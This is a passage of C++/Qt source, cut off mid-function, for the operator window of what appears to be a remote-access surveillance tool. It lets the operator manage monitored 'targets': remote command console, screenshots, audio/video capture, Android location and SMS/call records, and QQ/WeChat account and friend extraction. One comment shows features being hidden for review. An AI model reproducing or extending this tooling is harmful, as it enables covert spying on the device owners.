
#include "targetdlg.h"
#include "target.h"
#include "Utility.h"
#include "DatabaseManager.h"
#include "getdirinfodlg.h"
#include "TargetConnection.h"

#include "uploadfiledlg.h"
#include "downloaddirdlg.h"
#include "filemontypedlg.h"
#include "PicContainer.h"
#include "AppInfoDlg.h"
#include "thirdplugindlg.h"
#include "capturedlg.h"
#include "logdetaildlg.h"
#include "useractiondlg.h"
#include "multimediadlg.h"
#include "filectrldlg.h"
#include "remotecmddlg.h"
#include "advancemonitordlg.h"
#include "mapinfodlg.h"
#include "thirdplugindlg.h"
#include "exportappinfodlg.h"

#include "nofocusstyle.h"

#include "include/T5UsbConfig.h"
#include "include/T5Screen.h"

#include <shellapi.h>

#include <QFileIconProvider>

#include <activeqt/QAxObject.h>
#include <activeqt/QAxWidget.h>
#include <MsHTML.h>
#include <Mshtmhst.h>
#include <Exdisp.h>
#include <atlbase.h>

#include "skin.h"

#pragma comment(lib, "shell32.lib")

const wchar_t* TargetDlg::Net_description[] = {L"未联网", L"WIFI", L"3G", L"2G", L"4G"};

// ////////////////////////////////////////////////////////////////////////////////
// 构造函数
//
TargetDlg::TargetDlg(Target* target)
: QWidget(0)
, tarBlock(target)
, bShowFlag(false)
, bTaskManager(false)
, bAdvanceFileMonitor(false)
, bFileControl(false)
, bCmdConsole(false)
, bUserAction(false)
, bHttps(false)
, bLogInfo(false)
, bScreen(false)
, bMapInfo(false)
, bAppInfo(false)
, bThirdPlugin(false)
, bMultimedia(false)
{
	ui.setupUi(this);

	// 隐藏 https tab
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("HTTPS信息")));

	// 审查用
	/*ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("地图定位")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("远程控制台")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("外部插件")));*/

	if ( SYSTEM_WINDOWS != GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("远程控制台")));
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("外部插件")));
	}

	if ( SYSTEM_ANDROID != GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("地图定位")));
	}

	if ( !MobileDevice(this->tarBlock) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
	}
	else
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
	}

	/*if ( SYSTEM_IOS != this->tarBlock->m_sysType )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
	}*/

	//
	// 界面相关
	//

	InitWidgetAppearance();

	InitLocalDataDirList();

	InitConnection();

	// 检测用
	ui.trMissionStatus->topLevelItem(4)->setHidden(true);
	if ( SYSTEM_WINDOWS == GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")));
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
	}
	if ( SYSTEM_MACOSX == GetSystemType(this->tarBlock->dwOsBuildNumber) )
	{
		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
	}

	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("日志记录")));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("文件控制")), QString::fromLocal8Bit("文件浏览"));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")), QString::fromLocal8Bit("敏感信息"));
	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")), QString::fromLocal8Bit("屏幕截图"));
}

// ////////////////////////////////////////////////////////////////////////////////
// 析构函数
//
TargetDlg::~TargetDlg()
{
}

// ////////////////////////////////////////////////////////////////////////////////
// @public 设置当前 tab 页
//
void TargetDlg::SetCurrentTab(QString name)
{
	int index = GetTabIndexFromName(name);
	ui.tabMain->setCurrentIndex(index);
	DispatchTabInit(index);
}

// ////////////////////////////////////////////////////////////////////////////////
// @public 目标上线
//
void TargetDlg::TargetOnline()
{
	std::wstring title = 
		L"目标 " + 
		AnsiToWide(this->tarBlock->aniTargetName) + 
		L" { ID : " + 
		QString("%1").arg(this->tarBlock->dwTargetID).toStdWString() +
		L" }  [在线]";

	this->setWindowTitle(QString::fromStdWString(title));

	// 更新短信、通话记录
	
	UpdatePhoneRecord();

	InitTaskList();

}

void TargetDlg::UpdatePhoneRecord()
{
	if ( SYSTEM_ANDROID != GetSystemType(this->tarBlock->dwOsBuildNumber) )
		return;

	//DM->ClearSMSInfo(this->m_tar->dwTargetID);
	//DM->ClearCALInfo(this->m_tar->dwTargetID);
	//DM->ClearCONTACTnfo(this->m_tar->dwTargetID);

	//RefreshSMSData();
	//RefreshCALData();
	//RefreshCONTACTData();

	std::wstring recordFile = PhoneRecordFile;

	if ( FrmMain->ctrConn )
	{
		FrmMain->ctrConn->Send_FDL(tarBlock->dwTargetID,
			GetBase64FromWide(recordFile).c_str());
	}

}

// ////////////////////////////////////////////////////////////////////////////////
// @public 目标下线
//
void TargetDlg::TargetOffline()
{
	std::wstring title = 
		L"目标 " + 
		AnsiToWide(this->tarBlock->aniTargetName) + 
		L" { ID : " + 
		QString("%1").arg(this->tarBlock->dwTargetID).toStdWString() +
		L" }  [离线]";

	setWindowTitle(QString::fromStdWString(title));

	//SendMessage(this->Handle, WM_REMOTERUN_FINISHED, NULL, NULL);

	// 当控制端离线的时候需要清空所有文件任务及任务列表，
	// 因为当控制端重新连接中转时，所有任务都会重新
	// 生成，为了避免任务重复，需要先清空旧的任务。
	//if ( !FrmMain->ctrOnlineFlag )
	//{
		// 清空所有文件任务
		this->tarBlock->ClearAllFileTask();

		// 清空任务列表
		ui.tbUploadFileList->clearContents();
		ui.tbUploadFileList->setRowCount(0);
		ui.tbDownloadFileList->clearContents();
		ui.tbDownloadFileList->setRowCount(0);
		ui.tbDirCommand->clearContents();
		ui.tbDirCommand->setRowCount(0);
		ui.tbFileCommand->clearContents();
		ui.tbFileCommand->setRowCount(0);
		ui.tbPluginData->clearContents();
		ui.tbPluginData->setRowCount(0);
	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected 界面显示之前执行一些操作
//
void TargetDlg::showEvent(QShowEvent *e)
{
	if (this->bShowFlag == false)
	{
		if (this->tarBlock->tarStatus == TARONLINE)
		{
			if ( FrmMain )
				TargetOnline();
		}
		else
		{
			if ( FrmMain )
				TargetOffline();
		}

		this->bShowFlag = true;
	}

	QWidget::showEvent(e);
}

// ////////////////////////////////////////////////////////////////////////////////
// @protected 接管 windows 消息
//
bool TargetDlg::winEvent(MSG *msg, long *result)
{
	if ( msg->message >= WM_SET_TAR_STATUSINFO_W )
	{
		switch( msg->message )
		{

		case WM_SET_TAR_STATUSINFO_W:
			on_WM_SET_TAR_STATUSINFO_W(msg);
			break;

		case WM_NEW_FILETASK:
			on_WM_NEW_FILETASK(msg);
			break;

		case WM_UPT_FILETASK_STATUS:
			on_WM_UPT_FILETASK_STATUS(msg);
			break;

		case WM_UPT_FILETASK_PROGRESS:
			on_WM_UPT_FILETASK_PROGRESS(msg);
			break;

		case WM_NEW_DIRTASK:
			on_WM_NEW_DIRTASK(msg);
			break;

		case WM_UPT_DIRTASK_STATUS:
			on_WM_UPT_DIRTASK_STATUS(msg);
			break;

		case WM_UPT_DIRTASK_STATISTIC:
			on_WM_UPT_DIRTASK_STATISTIC(msg);
			break;

		case WM_NEW_SEARCHTASK:
			on_WM_NEW_SEARCHTASK(msg);
			break;

		case WM_UPT_SEARCHTASK_STATUS:
			on_WM_UPT_SEARCHTASK_STATUS(msg);
			break;

		case WM_FILETASK_FINISHED:
			on_WM_FILETASK_FINISHED(msg);
			break;

		case WM_UPDATE_USB_FILE:
			on_WM_UPDATE_USB_FILE(msg);
			break;

		case WM_UPDATE_USB_OP:
			on_WM_UPDATE_USB_OP(msg);
			break;

		case WM_UPDATE_HTTPS:
			on_WM_UPDATE_HTTPS(msg);
			break;

		case WM_UPDATE_SCREEN:
			on_WM_UPDATE_SCREEN(msg);
			break;

		case WM_UPDATE_LIRINFO:
			on_WM_UPDATE_LIRINFO(msg);
			break;

		case WM_UPDATE_DIRINFO:
			on_WM_UPDATE_DIRINFO(msg);
			break;

		case WM_UPDATE_SEARCHINFO:
			on_WM_UPDATE_SEARCHINFO(msg);
			break;

		case WM_REMOTERUN_REDIRECT:
			on_WM_REMOTERUN_REDIRECT(msg);
			break;

		case WM_REMOTERUN_OUTPUT:
			on_WM_REMOTERUN_OUTPUT(msg);
			break;

		case WM_REMOTERUN_FINISHED:
			on_WM_REMOTERUN_FINISHED(msg);
			break;

		case WM_ONLINESEARCH_FOUND_BLOCK:
			on_WM_ONLINESEARCH_FOUND_BLOCK(msg);
			break;

		case WM_ONLINESEARCH_FINISHED:
			on_WM_ONLINESEARCH_FINISHED(msg);
			break;

		case WM_ONLINESEARCH_ERRORED:
			on_WM_ONLINESEARCH_ERRORED(msg);
			break;

		case WM_CAPFULLSCREEN_FINISHED:
			on_WM_CAPFULLSCREEN_FINISHED(msg);
			break;

		case WM_FILEMONITOR_FINISHED:
			on_WM_FILEMONITOR_FINISHED(msg);
			break;

		case WM_FILEMONITOR_CHANGED:
			on_WM_FILEMONITOR_CHANGED(msg);
			break;

		case WM_NEW_LOCATION:
			on_WM_NEW_LOCATION(msg);
			break;

		case WM_NEW_SKYPE_RECORD:
			on_WM_NEW_SKYPE_RECORD(msg);
			break;

		case WM_NEW_PLUGIN_DATA:
			on_WM_NEW_PLUGIN_DATA(msg);
			break;

		case WM_NEW_THIRD_PLUGIN_FILE:
			on_WM_NEW_THIRD_PLUGIN_FILE(msg);
			break;

		case WM_APP_INFO_FINISHED:
			on_WM_APP_INFO_FINISHED(msg);
			break;

		case WM_APP_QQ_ACCOUNT:
			on_WM_APP_QQ_ACCOUNT(msg);
			break;

		case WM_APP_QQ_FRIEND:
			on_WM_APP_QQ_FRIEND(msg);
			break;

		case WM_APP_QQ_TROOP:
			on_WM_APP_QQ_TROOP(msg);
			break;

		case WM_APP_WEIXIN_ACCOUNT:
			on_WM_APP_WEIXIN_ACCOUNT(msg);
			break;

		case WM_APP_WEIXIN_FRIEND:
			on_WM_APP_WEIXIN_FRIEND(msg);
			break;
		}

		return true;
	}

	return false;
}


// ////////////////////////////////////////////////////////////////////////////////
// @private slot 分发各 tab 页的初始化函数
//
void TargetDlg::DispatchTabInit(int index)
{
	typedef void (__thiscall TargetDlg::*INIT_FUNC)(void);

	std::map<std::wstring, INIT_FUNC> initMap;

	initMap[L"文件浏览"] = &TargetDlg::InitFileCtrl;
	initMap[L"远程控制台"] = &TargetDlg::InitRemoteCmd;
	initMap[L"任务状态"] = &TargetDlg::InitTaskStatus;
	initMap[L"敏感信息"] = &TargetDlg::InitUserActionMonitor;
	initMap[L"高级文件监控"] = &TargetDlg::InitAdvanceFileMonitor;
	initMap[L"屏幕截图"] = &TargetDlg::InitScreenshot;
	initMap[L"音视频监控"] = &TargetDlg::InitMultimedia;
	initMap[L"日志记录"] = &TargetDlg::InitLogInfo;
	initMap[L"地图定位"] = &TargetDlg::InitMapInfo;
	initMap[L"即时通讯取证"] = &TargetDlg::InitAppInfo;
	initMap[L"外部插件"] = &TargetDlg::InitThirdPlugin;

	std::wstring title = ui.tabMain->tabText(index).toStdWString();
	INIT_FUNC func = initMap[title];

	if ( func != NULL )
	{
		(this->*func)();
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 进入本地数据目录
//
void TargetDlg::onCmbLocalDirIndexChanged(int index)
{
	switch(index)
	{
	case 0:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widLocalDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 1:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widDiskDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 2:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widUsbDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 3:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widDelDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 4:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widDirPath.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 5:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widHttpsDataDir.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 6:
		ShellExecuteW(NULL, L"explore", this->tarBlock->wideScreenPath.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 7:
		ShellExecuteW(NULL, L"explore", this->tarBlock->widMultimediaPath.c_str(), NULL, NULL, SW_SHOW);
		break;

	case 8:
		ShellExecuteW(NULL, L"explore", this->tarBlock->wid3rdFilePath.c_str(), NULL, NULL, SW_SHOW);
		break;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 选择文件传输指令
//
void TargetDlg::onTrMissionStatusItemClicked(QTreeWidgetItem* item, int column)
{
	//if ( NULL != item->parent() )
	//{
		ui.stkMissionStatus->setCurrentIndex(ui.trMissionStatus->indexOfTopLevelItem(item));
	//	ui.lbMissionStatus->setText(item->parent()->text(0));
	//}
	//else
	//{
	//	ui.lbMissionStatus->setText(item->text(0));
	//}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 点击 继续 按钮
//
void TargetDlg::onBtnCountinueClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		MsgBoxErrorW(this->Handle, L"[脱机数据查看模式]不能对文件任务进行操作!");
		return;
	}

	// 获取当前任务列表
	QTableWidget* table = GetActiveFTListView();
	if ( NULL == table )
	{
		MsgBoxErrorW(this->Handle, L"请先选择一个任务！");
		return;
	}

	QList<QTableWidgetItem*> itemList = table->selectedItems();

	if ( 0 == itemList.count() )
	{
		MsgBoxErrorW(this->Handle, L"请先选择一个任务！");
		return;
	}

	QTableWidgetItem* item = itemList.at(0);
	QTableWidgetItem* curItem = table->item(item->row(), 0);

	if ( 0 == curItem->data(Qt::UserRole).toUInt() )
	{
		MsgBoxErrorW(this->Handle, L"不能继续该任务！");
		return;
	}

	DWORD taskStatus;
	DWORD targetID;
	DWORD taskID;
	DWORD taskType;

	if (table == ui.tbDirCommand || table == ui.tbDirInfoList )
	{
		DirTask *dirTask = (DirTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = dirTask->taskStatus;
		targetID = dirTask->dwTargetID;
		taskID = dirTask->dwTaskID;
		taskType = TASK_DIR;
	}   
	else
	{
		FileTask *fileTask = (FileTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = fileTask->taskStatus;
		targetID = fileTask->dwTargetID;
		taskID = fileTask->dwTaskID;
		taskType = fileTask->taskType;
	}

	if ((WORKING == taskStatus) || (PAUSED  == taskStatus))
	{
		if (WORKING == taskStatus) 
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"任务 ( ID : %d ) 正在执行 ...", taskID);
			return;
		}

		if (this->tarBlock->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"恢复任务 ( ID : %d )", taskID);
			this->tarBlock->tarConn->Send_RFT(targetID, taskID, taskType);
		}
	}
	else
	{
		SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"不能对任务 ( ID : %d ) 进行恢复操作", taskID);
		WCHAR info[MAX_PATH] = {0};
		wsprintf(info, L"不能对任务 ( ID : %d ) 进行恢复操作", taskID);
		MsgBoxErrorW(this->Handle, info);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 暂停
//
void TargetDlg::onBtnPauseClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		MsgBoxErrorW(this->Handle, L"[脱机数据查看模式]不能对文件任务进行操作!");
		return;
	}

	// 获取当前任务列表
	QTableWidget* table = GetActiveFTListView();
	if ( NULL == table )
	{
		MsgBoxErrorW(this->Handle, L"请先选择一个任务！");
		return;
	}

	QList<QTableWidgetItem*> itemList = table->selectedItems();

	if ( 0 == itemList.count() )
	{
		MsgBoxErrorW(this->Handle, L"请先选择一个任务！");
		return;
	}

	QTableWidgetItem* item = itemList.at(0);
	QTableWidgetItem* curItem = table->item(item->row(), 0);

	if ( 0 == curItem->data(Qt::UserRole).toUInt() )
	{
		MsgBoxErrorW(this->Handle, L"不能暂停该任务！");
		return;
	}

	DWORD taskStatus;
	DWORD targetID;
	DWORD taskID;
	DWORD taskType;

	if (table == ui.tbDirCommand || table == ui.tbDirInfoList )
	{
		DirTask *dirTask = (DirTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = dirTask->taskStatus;
		targetID = dirTask->dwTargetID;
		taskID = dirTask->dwTaskID;
		taskType = TASK_DIR;
	}   
	else
	{
		FileTask *fileTask = (FileTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = fileTask->taskStatus;
		targetID = fileTask->dwTargetID;
		taskID = fileTask->dwTaskID;
		taskType = fileTask->taskType;
	}

	if ((WORKING == taskStatus) || (PAUSED  == taskStatus))
	{
		if ( PAUSED  == taskStatus )
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"任务 ( ID : %d ) 已经处于暂停状态!", taskID);
			return;
		}

		if (this->tarBlock->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"暂停任务 ( ID : %d )", taskID);
			this->tarBlock->tarConn->Send_PFT(targetID, taskID, taskType);
		}
	}
	else
	{
		SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"不能对任务 ( ID : %d ) 进行暂停操作", taskID);
		WCHAR info[MAX_PATH] = {0};
		wsprintf(info, L"不能对任务 ( ID : %d ) 进行暂停操作", taskID);
		MsgBoxErrorW(this->Handle, info);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 取消
//
void TargetDlg::onBtnCancelClicked()
{
	if (FrmMain->ctrOnlineFlag == false)
	{
		MsgBoxErrorW(this->Handle, L"[脱机数据查看模式]不能对文件任务进行操作!");
		return;
	}

	// 获取当前任务列表
	QTableWidget* table = GetActiveFTListView();
	if ( NULL == table )
	{
		MsgBoxErrorW(this->Handle, L"请先选择一个任务！");
		return;
	}

	QList<QTableWidgetItem*> itemList = table->selectedItems();

	if ( 0 == itemList.count() )
	{
		MsgBoxErrorW(this->Handle, L"请先选择一个任务！");
		return;
	}

	QTableWidgetItem* item = itemList.at(0);
	QTableWidgetItem* curItem = table->item(item->row(), 0);

	if ( 0 == curItem->data(Qt::UserRole).toUInt() )
	{
		MsgBoxErrorW(this->Handle, L"不能取消该任务！");
		return;
	}

	DWORD taskStatus;
	DWORD targetID;
	DWORD taskID;
	DWORD taskType;

	if (table == ui.tbDirCommand || table == ui.tbDirInfoList )
	{
		DirTask *dirTask = (DirTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = dirTask->taskStatus;
		targetID = dirTask->dwTargetID;
		taskID = dirTask->dwTaskID;
		taskType = TASK_DIR;
	}   
	else
	{
		FileTask *fileTask = (FileTask *)curItem->data(Qt::UserRole).toUInt();
		taskStatus = fileTask->taskStatus;
		targetID = fileTask->dwTargetID;
		taskID = fileTask->dwTaskID;
		taskType = fileTask->taskType;
	}

	if ((WORKING == taskStatus) || (PAUSED  == taskStatus))
	{
		if (this->tarBlock->tarConn)
		{
			SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"取消任务 ( ID : %d )", taskID);
			this->tarBlock->tarConn->Send_CFT(targetID, taskID, taskType);
		}
	}
	else
	{
		SetTarStatusInfoExW(STATUS_INFO, this->tarBlock, L"不能对任务 ( ID : %d ) 进行取消操作", taskID);
		WCHAR info[MAX_PATH] = {0};
		wsprintf(info, L"不能对任务 ( ID : %d ) 进行取消操作", taskID);
		MsgBoxErrorW(this->Handle, info);
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private slot 点击目录下载列表中的 item
//
void TargetDlg::onDirDownloadItemClicked(QTableWidgetItem* item)
{
	ui.tbFileCommand->clearContents();
	ui.tbFileCommand->setRowCount(0);
	item = ui.tbDirCommand->item(item->row(), 0);
	DirTask *lpDirTask = (DirTask *)item->data(Qt::UserRole).toUInt();

	if ( FINISHED == lpDirTask->taskStatus )
	{
		DM->QueryDirDownDetail(this->tarBlock->dwTargetID, lpDirTask->dwTaskID, ui.tbFileCommand);
		return;
	}

	if ( lpDirTask )
	{
		DWORD   dwDirTaskID = lpDirTask->dwTaskID;

		std::map<ULONG , FileTask *>::iterator j = tarBlock->fileTaskMap.begin();
		for (; j != tarBlock->fileTaskMap.end(); j++)
		{
			FileTask *fileTask = (*j).second;
			if (fileTask->dwParentID == dwDirTaskID)
			{
				AddFileTaskToListView(fileTask);
			}
		}
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 界面外观微调
//
void TargetDlg::InitWidgetAppearance()
{
	NoFocusStyle* nofocusStyle = new NoFocusStyle(this);

	ui.tabMain->setStyleSheet(GetStylesheetFromFile(L"tab"));

	//
	// 任务状态
	//
	ui.trMissionStatus->setStyle(nofocusStyle);
	ui.trMissionStatus->topLevelItem(0)->setExpanded(true);

	// 目录下载列表
	ui.tbDirCommand->setStyle(nofocusStyle);
	ui.tbDirCommand->horizontalHeader()->resizeSection(2, 150);
	ui.tbDirCommand->horizontalHeader()->resizeSection(3, 100);
	ui.tbDirCommand->horizontalHeader()->resizeSection(4, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(5, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(6, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(7, 50);
	ui.tbDirCommand->horizontalHeader()->resizeSection(8, 50);

	ui.tbUploadFileList->setStyle(nofocusStyle);
	ui.tbDownloadFileList->setStyle(nofocusStyle);
	ui.tbFileCommand->setStyle(nofocusStyle);
	ui.tbDirInfoList->setStyle(nofocusStyle);
	ui.tbUploadPluginList->setStyle(nofocusStyle);
	ui.tbPluginData->setStyle(nofocusStyle);
	ui.cmbLocalDir->setStyle(nofocusStyle);

	ui.tabMain->setStyleSheet("");
	ui.frame_4->hide();
	setStyleSheet("");
	ui.tabMain->setTabPosition(QTabWidget::South);
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 由 tab 名得到 index
//
int TargetDlg::GetTabIndexFromName(QString name)
{
	for (int i = 0; i < ui.tabMain->count(); i++ )
	{
		if ( name == ui.tabMain->tabText(i) )
		{
			return i;
		}
	}

	return -1;
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化 signal & slot
//
void TargetDlg::InitConnection()
{

	// tab 页切换
	connect(ui.tabMain, SIGNAL(currentChanged(int)), this, SLOT(DispatchTabInit(int)));

	// 进入本地数据目录
	connect(ui.cmbLocalDir, SIGNAL(activated(int)), this, SLOT(onCmbLocalDirIndexChanged(int)));


	//////////////////////////////////////////
	// 任务状态

	// 左侧列表
	connect(ui.trMissionStatus, SIGNAL(itemClicked(QTreeWidgetItem*, int)), 
		this, SLOT(onTrMissionStatusItemClicked(QTreeWidgetItem*, int)));

	// 点击目录下载列表中的 item
	connect(ui.tbDirCommand, SIGNAL(itemClicked(QTableWidgetItem*)), this, SLOT(onDirDownloadItemClicked(QTableWidgetItem*)));

	// 继续、暂停、取消
	connect(ui.btnContinue, SIGNAL(clicked()), this, SLOT(onBtnCountinueClicked()));
	connect(ui.btnPause, SIGNAL(clicked()), this, SLOT(onBtnPauseClicked()));
	connect(ui.btnCancel, SIGNAL(clicked()), this, SLOT(onBtnCancelClicked()));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化本地数据目录列表
//
void TargetDlg::InitLocalDataDirList()
{
	ui.cmbLocalDir->clear();

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("点击进入本地数据目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("磁盘文件仿真目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("USB 盘文件仿真目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("删除文件仿真目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("目录变动数据目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("HTTPS 数据目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("屏幕监控文件目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("音视频监控文件目录"));

	ui.cmbLocalDir->addItem(
		QIcon(QPixmap(":/image/dirfilelist.png")), 
		QString::fromLocal8Bit("第三方插件数据目录"));
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化文件控制
//
void TargetDlg::InitFileCtrl()
{
	if (this->bFileControl == false)
	{
		m_fileCtrlDlg = new FileCtrlDlg(ui.frmFileCtrl, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmFileCtrl);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_fileCtrlDlg);
		//onRefreshMonitorDirInfoTriggered();

		this->bFileControl = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化控制台
//
void TargetDlg::InitRemoteCmd()
{
	if ( !bCmdConsole )
	{
		m_remoteCmdDlg = new RemoteCmdDlg(ui.frmRemoteCmd, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmRemoteCmd);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_remoteCmdDlg);
		bCmdConsole = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化任务状态
//
void TargetDlg::InitTaskStatus()
{
	if (this->bTaskManager == false)
	{
		// 第一次点击异步指令系统时，进行初始显示
		//

		//if (FrmMain->ctrOnlineFlag)
		//{
		//	ConvertToOnlineTask();
		//}
		//else
		//{
		//	ConvertToHistoryTask();
		//}

		//
		// 初始化插件数据回传列表
		//

		this->bTaskManager = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化屏幕截图
//
void TargetDlg::InitScreenshot()
{
	if ( !this->bScreen )
	{
		m_captureDlg = new CaptureDlg(ui.frmCapture, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmCapture);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_captureDlg);

		connect(m_captureDlg, SIGNAL(emitModify()), this, SLOT(ModifyCapturePolicy()));
		bScreen = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化音视频监控
//
void TargetDlg::InitMultimedia()
{
	if ( !this->bMultimedia )
	{
		m_multimediaDlg = new MultimediaDlg(ui.frmMultiMedia, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmMultiMedia);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_multimediaDlg);
		bMultimedia = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化用户行为监控
//
void TargetDlg::InitUserActionMonitor()
{
	if ( !this->bUserAction )
	{
		m_userActionDlg = new UserActionDlg(ui.frmUserAction, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmUserAction);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_userActionDlg);
		this->bUserAction = true;
	}
	
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化高级文件监控
//
void TargetDlg::InitAdvanceFileMonitor()
{
	if (bAdvanceFileMonitor == false)
	{
		m_advanceMonitorDlg = new AdvanceMonitorDlg(ui.frmAdvanceMonitor, this->tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmAdvanceMonitor);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_advanceMonitorDlg);
		this->bAdvanceFileMonitor = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化上下线日志
//
void TargetDlg::InitLogInfo()
{
	if ( !this->bLogInfo )
	{
		m_logDetailDlg = new LogDetailDlg(ui.frmLog, this->tarBlock);
		connect(this, SIGNAL(emitRefreshOnlineLogInfo()), m_logDetailDlg, SLOT(RefreshOnlineLogInfo()));
		QHBoxLayout* layout = new QHBoxLayout(ui.frmLog);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_logDetailDlg);
		this->bLogInfo = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化地图
//
void TargetDlg::InitMapInfo()
{
	if ( !this->bMapInfo )
	{
		m_mapInfoDlg = new MapInfoDlg(ui.frmMapInfo, tarBlock);
		QHBoxLayout* layout = new QHBoxLayout(ui.frmMapInfo);
		layout->setContentsMargins(0, 0, 0, 0);
		layout->addWidget(m_mapInfoDlg);
		bMapInfo = true;
	}
}

// ////////////////////////////////////////////////////////////////////////////////
// @private 初始化应用取证
//
void TargetDlg::InitAppInfo()
{
